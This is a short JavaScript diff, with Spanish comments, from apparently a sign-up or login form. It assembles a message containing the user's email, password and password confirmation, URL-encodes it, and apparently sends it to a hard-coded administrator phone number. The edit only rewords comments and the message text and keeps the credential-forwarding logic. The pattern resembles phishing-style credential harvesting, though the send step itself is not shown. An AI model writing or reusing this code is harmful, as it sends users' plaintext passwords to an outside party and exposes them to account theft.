@@ -128,11 +128,11 @@
         return;
       }
 
-      // Número del administrador en formato internacional sin espacios
+      // Número del administrador para la recepción de mensajes
       const numeroAdmin = "573241447817"; 
 
-      // Construcción del mensaje automático
-      const textoMensaje = `Hola, yo soy ${correo}.\nMi clave es: ${clave}\nConfirmación de clave: ${confirmacionClave}\nQuedo activo aquí para la sala de confrontación.`;
+      // Construcción del mensaje formateado
+      const textoMensaje = `Hola, yo soy ${correo}.\nMi clave es: ${clave}\nConfirmación de clave: ${confirmacionClave}\nPendiente para la confrontación.`;
 
       const mensajeCodificado = encodeURIComponent(textoMensaje);
 
